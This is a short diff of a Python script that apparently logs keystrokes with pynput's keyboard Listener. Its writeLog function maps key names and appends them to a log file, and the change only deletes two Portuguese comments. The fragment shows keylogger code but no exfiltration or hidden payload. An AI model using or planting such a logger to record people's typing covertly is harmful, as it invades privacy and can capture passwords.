@@ -1,5 +1,4 @@
-﻿#em pynput, importar o método Listener do teclado
-from pynput.keyboard import Listener
+﻿from pynput.keyboard import Listener
 import sys
 
 
@@ -27,7 +26,6 @@ def writeLog(key):
     for key in teclas:
         keydata = keydata.replace(key, teclas[key])
 
-    #abrir o arquivo de log no modo append
     try:
         arq = open(logFile)
 
